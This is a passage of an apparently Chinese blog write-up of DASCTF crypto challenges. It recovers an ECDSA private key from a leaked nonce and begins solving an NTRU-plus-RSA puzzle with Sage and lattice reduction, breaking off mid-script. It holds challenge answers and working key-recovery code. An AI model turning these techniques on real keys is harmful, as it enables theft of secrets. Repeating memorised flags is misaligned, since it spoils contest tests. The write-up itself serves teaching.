hashlib</span><br><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;xxx&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;DASCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">40</span></span><br><span class="line">flag = <span class="string">&#x27;0&#x27;</span>*<span class="number">40</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    initiation</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> pub_key, priv_key, order, base,secret</span><br><span class="line">    gen = ecdsa.NIST256p.generator</span><br><span class="line">    order = gen.order()</span><br><span class="line">    secret = bytes_to_long(flag[<span class="number">7</span>:-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret)</span><br><span class="line">    priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">msg, nonce</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    sign msg</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    msg = <span class="built_in">int</span>(hashlib.sha256(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    sign = priv_key.sign(msg, nonce)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;R:&quot;</span>, <span class="built_in">hex</span>(sign.r)[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;S:&quot;</span>, <span class="built_in">hex</span>(sign.s)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">nonce = random.getrandbits(order.bit_length())</span><br><span class="line">sign(<span class="string">b&#x27;welcome to ecdsa&#x27;</span>, nonce)</span><br><span class="line"><span class="built_in">print</span>(nonce)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">R: 7b35712a50d463ac5acf7af1675b4b63ba0da23b6452023afddd58d4891ef6e5</span></span><br><span class="line"><span class="string">S: a452fc44cc36fa6964d1b4f47392ff0a91350cfd58f11a4645c084d56e387e5c</span></span><br><span class="line"><span class="string">nonce = 57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>ecdsa签名，k泄漏，有msg算其hash值，可求私钥x</p><p>$x \equiv r^{-1}(ks-H(m)) \bmod n$</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> hashlib</span><br><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">import</span> ecdsa</span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=<span class="number">0</span>x<span class="number">7</span>b<span class="number">35712</span>a<span class="number">50</span>d<span class="number">463</span>ac<span class="number">5</span>acf<span class="number">7</span>af<span class="number">1675</span>b<span class="number">4</span>b<span class="number">63</span>ba<span class="number">0</span>da<span class="number">23</span>b<span class="number">6452023</span>afddd<span class="number">58</span>d<span class="number">4891</span>ef<span class="number">6</span>e<span class="number">5</span></span><br><span class="line"><span class="attribute">s</span>=<span class="number">0</span>xa<span class="number">452</span>fc<span class="number">44</span>cc<span class="number">36</span>fa<span class="number">6964</span>d<span class="number">1</span>b<span class="number">4</span>f<span class="number">47392</span>ff<span class="number">0</span>a<span class="number">91350</span>cfd<span class="number">58</span>f<span class="number">11</span>a<span class="number">4645</span>c<span class="number">084</span>d<span class="number">56</span>e<span class="number">387</span>e<span class="number">5</span>c</span><br><span class="line"><span class="attribute">k</span>=<span class="number">57872441580840888721108499129165088876046881204464784483281653404168342111855</span></span><br><span class="line"><span class="attribute">msg</span> = b&#x27;welcome to ecdsa&#x27;</span><br><span class="line"><span class="attribute">msg</span> = int(hashlib.sha<span class="number">256</span>(msg).hexdigest(), <span class="number">16</span>)</span><br><span class="line"><span class="attribute">gen</span> = ecdsa.NIST<span class="number">256</span>p.generator</span><br><span class="line"><span class="attribute">n</span> = gen.order()</span><br><span class="line"><span class="attribute">print</span>(n)</span><br><span class="line"><span class="attribute">x</span>=int((gmpy<span class="number">2</span>.invert(r, n)*(k*s-msg)) % n)</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(x))  # <span class="number">11</span>b<span class="number">7311</span>d<span class="number">4</span>f<span class="number">0137074</span>a<span class="number">7256</span>d<span class="number">3</span>eb<span class="number">82</span>f<span class="number">368</span></span><br></pre></td></tr></table></figure><blockquote><p>DASCTF{11b7311d4f0137074a7256d3eb82f368}</p></blockquote><h1 id="NTRURSA"><a href="#NTRURSA" class="headerlink" title="NTRURSA"></a>NTRURSA</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    p1 = getPrime(<span class="number">256</span>)</span><br><span class="line">    while True:</span><br><span class="line">        f = getRandomRange(<span class="number">1</span>, iroot(p1 <span class="comment">// 2, 2)[0])</span></span><br><span class="line">        g = getRandomRange(iroot(p1 <span class="comment">// 4, 2)[0], iroot(p1 // 2, 2)[0])</span></span><br><span class="line">        if gcd(f, p1) == <span class="number">1</span> and gcd(f, g) == <span class="number">1</span> and isPrime(g) == <span class="number">1</span>:</span><br><span class="line">            break</span><br><span class="line">    rand = getRandomRange(<span class="number">0</span>, <span class="number">2</span> ^ <span class="number">20</span>)</span><br><span class="line">    g1 = g ^^ rand</span><br><span class="line">    h = (inverse(f, p1) * g1) % p1</span><br><span class="line">    return h, p1, g, f, g1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen_irreducable_poly(deg):</span><br><span class="line">    while True:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        if out.is_irreducible():</span><br><span class="line">            return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">h, p1, g, f, g1 = gen()</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = g * q </span><br><span class="line">e = <span class="number">0</span>x10001</span><br><span class="line">c1 = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line">hint = list(str(h))</span><br><span class="line">length = len(hint)</span><br><span class="line">bits = <span class="number">16</span></span><br><span class="line">p2 = random_prime(<span class="number">2</span> ^ bits - <span class="number">1</span>, False, <span class="number">2</span> ^ (bits - <span class="number">1</span>))</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p2))</span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span> * length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span> * length))</span><br><span class="line">N = P * Q</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line">m = S(hint)</span><br><span class="line">c2 = m ^ e</span><br><span class="line">print(<span class="string">&quot;p1 =&quot;</span>, p1)</span><br><span class="line">print(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line">print(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;p2 =&quot;</span>, p2)</span><br><span class="line">print(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line">print(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p1 = <span class="number">10647206124111</span><span class="number">29228614606443</span><span class="number">42336453303928</span><span class="number">20201023728471</span><span class="number">53547176305021</span><span class="number">68520267</span></span><br><span class="line">c1 = <span class="number">20920247107738</span><span class="number">49678407105023</span><span class="number">94225409362245</span><span class="number">77122721266141</span><span class="number">05795755160370</span><span class="number">59729664572031</span><span class="number">77812404896852</span><span class="number">11097576831546</span><span class="number">48529622106485</span><span class="number">35130235298413</span><span class="number">61159865865977</span><span class="number">71089200149296</span><span class="number">32531307409885</span><span class="number">86894184292181</span><span class="number">57350089813355</span><span class="number">82297975794108</span><span class="number">01615121039444</span><span class="number">60098903120432</span><span class="number">59167806981442</span><span class="number">42550520014128</span><span class="number">31383182690588</span><span class="number">18777636637375</span><span class="number">10100554030873</span><span class="number">60219765594952</span><span class="number">6633235771</span>4</span><br><span class="line">p2 = <span class="number">6462</span>1</span><br><span class="line">c2 = <span class="number">1992</span>1*x^174 + <span class="number">4919</span>2*x^173 + <span class="number">1889</span>4*x^172 + <span class="number">6112</span>1*x^171 + <span class="number">5027</span>1*x^170 + <span class="number">1186</span>0*x^169 + <span class="number">5312</span>8*x^168 + <span class="number">3865</span>8*x^167 + <span class="number">1419</span>1*x^166 + <span class="number">9671</span>*x^165 + <span class="number">4087</span>9*x^164 + <span class="number">1518</span>7*x^163 + <span class="number">3352</span>3*x^162 + <span class="number">6227</span>0*x^161 + <span class="number">6421</span>1*x^160 + <span class="number">5451</span>8*x^159 + <span class="number">5044</span>6*x^158 + <span class="number">2597</span>*x^157 + <span class="number">3221</span>6*x^156 + <span class="number">1050</span>0*x^155 + <span class="number">6327</span>6*x^154 + <span class="number">2791</span>6*x^153 + <span class="number">5531</span>6*x^152 + <span class="number">3089</span>8*x^151 + <span class="number">4370</span>6*x^150 + <span class="number">5734</span>*x^149 + <span class="number">3561</span>6*x^148 + <span class="number">1428</span>8*x^147 + <span class="number">1828</span>2*x^146 + <span class="number">2278</span>8*x^145 + <span class="number">4818</span>8*x^144 + <span class="number">3417</span>6*x^143 + <span class="number">5595</span>2*x^142 + <span class="number">9578</span>*x^141 + <span class="number">9177</span>*x^140 + <span class="number">2208</span>3*x^139 + <span class="number">1458</span>6*x^138 + <span class="number">9748</span>*x^137 + <span class="number">2111</span>8*x^136 + 155*x^135 + <span class="number">6422</span>4*x^134 + <span class="number">1819</span>3*x^133 + <span class="number">3373</span>2*x^132 + <span class="number">3813</span>5*x^131 + <span class="number">5199</span>2*x^130 + <span class="number">8203</span>*x^129 + <span class="number">8538</span>*x^128 + <span class="number">5520</span>3*x^127 + <span class="number">5003</span>*x^126 + <span class="number">2009</span>*x^125 + <span class="number">4502</span>3*x^124 + <span class="number">1231</span>1*x^123 + <span class="number">2142</span>8*x^122 + <span class="number">2411</span>0*x^121 + <span class="number">4353</span>7*x^120 + <span class="number">2188</span>5*x^119 + <span class="number">5021</span>2*x^118 + <span class="number">4044</span>5*x^117 + <span class="number">1776</span>8*x^116 + <span class="number">4661</span>6*x^115 + <span class="number">4771</span>*x^114 + <span class="number">2090</span>3*x^113 + <span class="number">4776</span>4*x^112 + <span class="number">1305</span>6*x^111 + <span class="number">5083</span>7*x^110 + <span class="number">2231</span>3*x^109 + <span class="number">3969</span>8*x^108 + <span class="number">6037</span>7*x^107 + <span class="number">5935</span>7*x^106 + <span class="number">2405</span>1*x^105 + <span class="number">5888</span>*x^104 + <span class="number">2941</span>4*x^103 + <span class="number">3172</span>6*x^102 + <span class="number">4906</span>*x^101 + <span class="number">2396</span>8*x^100 + <span class="number">5236</span>0*x^99 + <span class="number">5806</span>3*x^98 + 706*x^97 + <span class="number">3142</span>0*x^96 + <span class="number">6246</span>8*x^95 + <span class="number">1855</span>7*x^94 + <span class="number">1498</span>*x^93 + <span class="number">1759</span>0*x^92 + <span class="number">6299</span>0*x^91 + <span class="number">2720</span>0*x^90 + <span class="number">7052</span>*x^89 + <span class="number">3911</span>7*x^88 + <span class="number">4694</span>4*x^87 + <span class="number">4553</span>5*x^86 + <span class="number">2809</span>2*x^85 + <span class="number">1981</span>*x^84 + <span class="number">4377</span>*x^83 + <span class="number">3441</span>9*x^82 + <span class="number">3375</span>4*x^81 + <span class="number">2640</span>*x^80 + <span class="number">4442</span>7*x^79 + <span class="number">3217</span>9*x^78 + <span class="number">5772</span>1*x^77 + <span class="number">9444</span>*x^76 + <span class="number">4937</span>4*x^75 + <span class="number">2128</span>8*x^74 + <span class="number">4409</span>8*x^73 + <span class="number">5774</span>4*x^72 + <span class="number">6345</span>7*x^71 + <span class="number">4330</span>0*x^70 + <span class="number">1508</span>*x^69 + <span class="number">1377</span>5*x^68 + <span class="number">2319</span>7*x^67 + <span class="number">4307</span>0*x^66 + <span class="number">2075</span>1*x^65 + <span class="number">4747</span>9*x^64 + <span class="number">1849</span>6*x^63 + <span class="number">5339</span>2*x^62 + <span class="number">1038</span>7*x^61 + <span class="number">2317</span>*x^60 + <span class="number">5749</span>2*x^59 + <span class="number">2544</span>1*x^58 + <span class="number">5253</span>2*x^57 + <span class="number">2715</span>0*x^56 + <span class="number">3378</span>8*x^55 + <span class="number">4337</span>1*x^54 + <span class="number">3097</span>2*x^53 + <span class="number">3958</span>3*x^52 + <span class="number">3640</span>7*x^51 + <span class="number">3556</span>4*x^50 + <span class="number">4456</span>4*x^49 + <span class="number">1505</span>*x^48 + <span class="number">4751</span>9*x^47 + <span class="number">3869</span>5*x^46 + <span class="number">4310</span>7*x^45 + <span class="number">1676</span>*x^44 + <span class="number">4205</span>7*x^43 + <span class="number">4987</span>9*x^42 + <span class="number">2908</span>3*x^41 + <span class="number">4224</span>1*x^40 + <span class="number">8853</span>*x^39 + <span class="number">3354</span>6*x^38 + <span class="number">4895</span>4*x^37 + <span class="number">3035</span>2*x^36 + <span class="number">6202</span>0*x^35 + <span class="number">3986</span>4*x^34 + <span class="number">9519</span>*x^33 + <span class="number">2482</span>8*x^32 + <span class="number">3469</span>6*x^31 + <span class="number">2387</span>*x^30 + <span class="number">2741</span>3*x^29 + <span class="number">5582</span>9*x^28 + <span class="number">4021</span>7*x^27 + <span class="number">3020</span>5*x^26 + <span class="number">4232</span>8*x^25 + <span class="number">6210</span>*x^24 + <span class="number">5244</span>2*x^23 + <span class="number">5849</span>5*x^22 + <span class="number">2014</span>*x^21 + <span class="number">2645</span>2*x^20 + <span class="number">3354</span>7*x^19 + <span class="number">1984</span>0*x^18 + <span class="number">5995</span>*x^17 + <span class="number">1685</span>0*x^16 + <span class="number">3785</span>5*x^15 + <span class="number">7221</span>*x^14 + <span class="number">3220</span>0*x^13 + <span class="number">8121</span>*x^12 + <span class="number">2376</span>7*x^11 + <span class="number">4656</span>3*x^10 + <span class="number">5167</span>3*x^9 + <span class="number">1937</span>2*x^8 + <span class="number">4157</span>*x^7 + <span class="number">4842</span>1*x^6 + <span class="number">4109</span>6*x^5 + <span class="number">4573</span>5*x^4 + <span class="number">5302</span>2*x^3 + <span class="number">3547</span>5*x^2 + <span class="number">4752</span>1*x + <span class="number">2754</span>4</span><br><span class="line">n = <span class="number">31398174203566</span><span class="number">22921066553409</span><span class="number">41266013156830</span><span class="number">74641013205440</span><span class="number">47655258431211</span><span class="number">28836382783901</span><span class="number">05806127975406</span><span class="number">22478312834004</span><span class="number">11293167825490</span><span class="number">09811196493319</span><span class="number">66533601669098</span><span class="number">55578623675515</span><span class="number">45487842904828</span><span class="number">05129361383627</span><span class="number">59875958710046</span><span class="number">01968935866634</span><span class="number">95552877553684</span><span class="number">74025817349107</span><span class="number">42403788941725</span><span class="number">30414619214916</span><span class="number">57311941990241</span><span class="number">54454952157531</span><span class="number">06888111441126</span><span class="number">55385474620172</span><span class="number">0736136285</span>7</span><br><span class="line">N = <span class="number">2508</span>1*x^175 + <span class="number">8744</span>*x^174 + <span class="number">9823</span>*x^173 + <span class="number">9037</span>*x^172 + <span class="number">6343</span>*x^171 + <span class="number">4220</span>5*x^170 + <span class="number">2857</span>3*x^169 + <span class="number">5571</span>4*x^168 + <span class="number">1728</span>7*x^167 + <span class="number">1122</span>9*x^166 + <span class="number">4263</span>0*x^165 + <span class="number">6436</span>3*x^164 + <span class="number">5075</span>9*x^163 + <span class="number">3368</span>*x^162 + <span class="number">2090</span>0*x^161 + <span class="number">5594</span>7*x^160 + <span class="number">7082</span>*x^159 + <span class="number">2317</span>1*x^158 + <span class="number">4851</span>0*x^157 + <span class="number">2001</span>3*x^156 + <span class="number">1679</span>8*x^155 + <span class="number">6043</span>8*x^154 + <span class="number">5877</span>9*x^153 + <span class="number">9289</span>*x^152 + <span class="number">1062</span>3*x^151 + <span class="number">1085</span>*x^150 + <span class="number">2347</span>3*x^149 + <span class="number">1379</span>5*x^148 + <span class="number">2071</span>*x^147 + <span class="number">3151</span>5*x^146 + <span class="number">4283</span>2*x^145 + <span class="number">3815</span>2*x^144 + <span class="number">3755</span>9*x^143 + <span class="number">4765</span>3*x^142 + <span class="number">3737</span>1*x^141 + <span class="number">3912</span>8*x^140 + <span class="number">4875</span>0*x^139 + <span class="number">1663</span>8*x^138 + <span class="number">6032</span>0*x^137 + <span class="number">5622</span>4*x^136 + <span class="number">4187</span>0*x^135 + <span class="number">6396</span>1*x^134 + <span class="number">4757</span>4*x^133 + <span class="number">6395</span>4*x^132 + <span class="number">9668</span>*x^131 + <span class="number">6236</span>0*x^130 + <span class="number">1524</span>4*x^129 + <span class="number">2059</span>9*x^128 + <span class="number">2870</span>4*x^127 + <span class="number">2685</span>7*x^126 + <span class="number">3488</span>5*x^125 + <span class="number">3310</span>7*x^124 + <span class="number">1769</span>3*x^123 + <span class="number">5275</span>3*x^122 + <span class="number">6074</span>4*x^121 + <span class="number">2130</span>5*x^120 + <span class="number">6378</span>5*x^119 + <span class="number">5440</span>0*x^118 + <span class="number">1781</span>2*x^117 + <span class="number">6454</span>9*x^116 + <span class="number">2003</span>5*x^115 + <span class="number">3756</span>7*x^114 + <span class="number">3860</span>7*x^113 + <span class="number">3278</span>3*x^112 + <span class="number">2438</span>5*x^111 + <span class="number">5387</span>*x^110 + <span class="number">5134</span>*x^109 + <span class="number">4589</span>3*x^108 + <span class="number">5830</span>7*x^107 + <span class="number">3382</span>1*x^106 + <span class="number">5490</span>2*x^105 + <span class="number">1423</span>6*x^104 + <span class="number">5804</span>4*x^103 + <span class="number">4125</span>7*x^102 + <span class="number">4688</span>1*x^101 + <span class="number">4283</span>4*x^100 + <span class="number">1693</span>*x^99 + <span class="number">4605</span>8*x^98 + <span class="number">1563</span>6*x^97 + <span class="number">2711</span>1*x^96 + <span class="number">3158</span>*x^95 + <span class="number">4101</span>2*x^94 + <span class="number">2602</span>8*x^93 + <span class="number">3576</span>*x^92 + <span class="number">3795</span>8*x^91 + <span class="number">3327</span>3*x^90 + <span class="number">6022</span>8*x^89 + <span class="number">4122</span>9*x^88 + <span class="number">1123</span>2*x^87 + <span class="number">1263</span>5*x^86 + <span class="number">1794</span>2*x^85 + 4*x^84 + <span class="number">2539</span>7*x^83 + <span class="number">6352</span>6*x^82 + <span class="number">5487</span>2*x^81 + <span class="number">4031</span>8*x^80 + <span class="number">3749</span>8*x^79 + <span class="number">5218</span>2*x^78 + <span class="number">4881</span>7*x^77 + <span class="number">1076</span>3*x^76 + <span class="number">4654</span>2*x^75 + <span class="number">3606</span>0*x^74 + <span class="number">4997</span>2*x^73 + <span class="number">6360</span>3*x^72 + <span class="number">4650</span>6*x^71 + <span class="number">4478</span>8*x^70 + <span class="number">4490</span>5*x^69 + <span class="number">4611</span>2*x^68 + <span class="number">5297</span>*x^67 + <span class="number">2644</span>0*x^66 + <span class="number">2847</span>0*x^65 + <span class="number">1552</span>5*x^64 + <span class="number">1156</span>6*x^63 + <span class="number">1578</span>1*x^62 + <span class="number">3609</span>8*x^61 + <span class="number">4440</span>2*x^60 + <span class="number">5533</span>1*x^59 + <span class="number">6158</span>3*x^58 + <span class="number">1640</span>6*x^57 + <span class="number">5908</span>9*x^56 + <span class="number">5316</span>1*x^55 + <span class="number">4369</span>5*x^54 + <span class="number">4958</span>0*x^53 + <span class="number">6268</span>5*x^52 + <span class="number">3144</span>7*x^51 + <span class="number">2675</span>5*x^50 + <span class="number">1481</span>0*x^49 + <span class="number">3281</span>*x^48 + <span class="number">2737</span>1*x^47 + <span class="number">5339</span>2*x^46 + <span class="number">2648</span>*x^45 + <span class="number">1009</span>5*x^44 + <span class="number">2597</span>7*x^43 + <span class="number">2291</span>2*x^42 + <span class="number">4127</span>8*x^41 + <span class="number">3323</span>6*x^40 + <span class="number">5779</span>2*x^39 + <span class="number">7169</span>*x^38 + <span class="number">2925</span>0*x^37 + <span class="number">1690</span>6*x^36 + <span class="number">4436</span>*x^35 + <span class="number">2729</span>*x^34 + <span class="number">2973</span>6*x^33 + <span class="number">1938</span>3*x^32 + <span class="number">1192</span>1*x^31 + <span class="number">2607</span>5*x^30 + <span class="number">5461</span>6*x^29 + 739*x^28 + <span class="number">3850</span>9*x^27 + <span class="number">1911</span>8*x^26 + <span class="number">2006</span>2*x^25 + <span class="number">2128</span>0*x^24 + <span class="number">1259</span>4*x^23 + <span class="number">1497</span>4*x^22 + <span class="number">2779</span>5*x^21 + <span class="number">5410</span>7*x^20 + <span class="number">1890</span>*x^19 + <span class="number">1341</span>0*x^18 + <span class="number">5381</span>*x^17 + <span class="number">1950</span>0*x^16 + <span class="number">4748</span>1*x^15 + <span class="number">5848</span>8*x^14 + <span class="number">2643</span>3*x^13 + <span class="number">3780</span>3*x^12 + <span class="number">6023</span>2*x^11 + <span class="number">3477</span>2*x^10 + <span class="number">1505</span>*x^9 + <span class="number">6376</span>0*x^8 + <span class="number">2089</span>0*x^7 + <span class="number">4153</span>3*x^6 + <span class="number">1613</span>0*x^5 + <span class="number">2976</span>9*x^4 + <span class="number">4914</span>2*x^3 + <span class="number">6418</span>4*x^2 + <span class="number">5544</span>3*x + <span class="number">4592</span>5</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><ul><li>多项式RSA解出h</li><li>对于NTRU参数，用<a href="https://lazzzaro.github.io/2020/11/07/crypto-格密码/">LLL求g1</a></li><li>遍历rand异或出n的因子g</li><li>常规RSA求解出flag</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span>, libnum</span><br><span class="line"><span class="attribute">p</span> = <span class="number">64621</span></span><br><span class="line"><span class="attribute">S</span>.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line"><span class="attribute">N</span> = <span class="number">25081</span>*x^<span class="number">175</span> + <span class="number">8744</span>*x^<span class="number">174</span> + <span class="number">9823</span>*x^<span class="number">173</span> + <span class="number">9037</span>*x^<span class="number">172</span> + <span class="number">6343</span>*x^<span class="number">171</span> + <span class="number">42205</span>*x^<span class="number">170</span> + <span class="number">28573</span>*x^<span class="number">169</span> + <span class="number">55714</span>*x^<span class="number">168</span> + <span class="number">17287</span>*x^<span class="number">167</span> + <span class="number">11229</span>*x^<span class="number">166</span> + <span class="number">42630</span>*x^<span class="number">165</span> + <span class="number">64363</span>*x^<span class="number">164</span> + <span class="number">50759</span>*x^<span class="number">163</span> + <span class="number">3368</span>*x^<span class="number">162</span> + <span class="number">20900</span>*x^<span class="number">161</span> + <span class="number">55947</span>*x^<span class="number">160</span> + <span class="number">7082</span>*x^<span class="number">159</span> + <span class="number">23171</span>*x^<span class="number">158</span> + <span class="number">48510</span>*x^<span class="number">157</span> + <span class="number">20013</span>*x^<span class="number">156</span> + <span class="number">16798</span>*x^<span class="number">155</span> + <span class="number">60438</span>*x^<span class="number">154</span> + <span class="number">58779</span>*x^<span class="number">153</span> + <span class="number">9289</span>*x^<span class="number">152</span> + <span class="number">10623</span>*x^<span class="number">151</span> + <span class="number">1085</span>*x^<span class="number">150</span> + <span class="number">23473</span>*x^<span class="number">149</span> + <span class="number">13795</span>*x^<span class="number">148</span> + <span class="number">2071</span>*x^<span class="number">147</span> + <span class="number">31515</span>*x^<span class="number">146</span> + <span class="number">42832</span>*x^<span class="number">145</span> + <span class="number">38152</span>*x^<span class="number">144</span> + <span class="number">37559</span>*x^<span class="number">143</span> + <span class="number">47653</span>*x^<span class="number">142</span> + <span class="number">37371</span>*x^<span class="number">141</span> + <span class="number">39128</span>*x^<span class="number">140</span> + <span class="number">48750</span>*x^<span class="number">139</span> + <span class="number">16638</span>*x^<span class="number">138</span> + <span class="number">60320</span>*x^<span class="number">137</span> + <span class="number">56224</span>*x^<span class="number">136</span> + <span class="number">41870</span>*x^<span class="number">135</span> + <span class="number">63961</span>*x^<span class="number">134</span> + <span class="number">47574</span>*x^<span class="number">133</span> + <span class="number">63954</span>*x^<span class="number">132</span> + <span class="number">9668</span>*x^<span class="number">131</span> + <span class="number">62360</span>*x^<span class="number">130</span> + <span class="number">15244</span>*x^<span class="number">129</span> + <span class="number">20599</span>*x^<span class="number">128</span> + <span class="number">28704</span>*x^<span class="number">127</span> + <span class="number">26857</span>*x^<span class="number">126</span> + <span class="number">34885</span>*x^<span class="number">125</span> + <span class="number">33107</span>*x^<span class="number">124</span> + <span class="number">17693</span>*x^<span class="number">123</span> + <span class="number">52753</span>*x^<span class="number">122</span> + <span class="number">60744</span>*x^<span class="number">121</span> + <span class="number">21305</span>*x^<span class="number">120</span> + <span class="number">63785</span>*x^<span class="number">119</span> + <span class="number">54400</span>*x^<span class="number">118</span> + <span class="number">17812</span>*x^<span class="number">117</span> + <span class="number">64549</span>*x^<span class="number">116</span> + <span class="number">20035</span>*x^<span class="number">115</span> + <span class="number">37567</span>*x^<span class="number">114</span> + <span class="number">38607</span>*x^<span class="number">113</span> + <span class="number">32783</span>*x^<span class="number">112</span> + <span class="number">24385</span>*x^<span class="number">111</span> + <span class="number">5387</span>*x^<span class="number">110</span> + <span class="number">5134</span>*x^<span class="number">109</span> + <span class="number">45893</span>*x^<span class="number">108</span> + <span class="number">58307</span>*x^<span class="number">107</span> + <span class="number">33821</span>*x^<span class="number">106</span> + <span class="number">54902</span>*x^<span class="number">105</span> + <span class="number">14236</span>*x^<span class="number">104</span> + <span class="number">58044</span>*x^<span class="number">103</span> + <span class="number">41257</span>*x^<span class="number">102</span> + <span class="number">46881</span>*x^<span class="number">101</span> + <span class="number">42834</span>*x^<span class="number">100</span> + <span class="number">1693</span>*x^<span class="number">99</span> + <span class="number">46058</span>*x^<span class="number">98</span> + <span class="number">15636</span>*x^<span class="number">97</span> + <span class="number">27111</span>*x^<span class="number">96</span> + <span class="number">3158</span>*x^<span class="number">95</span> + <span 